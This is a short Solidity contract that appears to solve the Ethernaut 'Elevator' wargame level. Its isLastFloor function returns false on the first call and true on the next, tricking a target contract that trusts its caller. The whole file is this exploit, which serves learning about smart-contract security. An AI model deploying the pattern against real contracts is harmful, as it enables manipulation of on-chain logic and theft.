// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface ILevel {
    function goTo(uint _floor) external;
}

contract ElevatorRun { 
    bool firstCallLastFloor = true;

    function run(address _levelAddress) external {     
        ILevel(_levelAddress).goTo(1);
    }
    
    function isLastFloor(uint _floor) external returns (bool) {
        if (firstCallLastFloor){
            firstCallLastFloor = false;
            return false;
        }else{
            return true;
        }
    }
    
}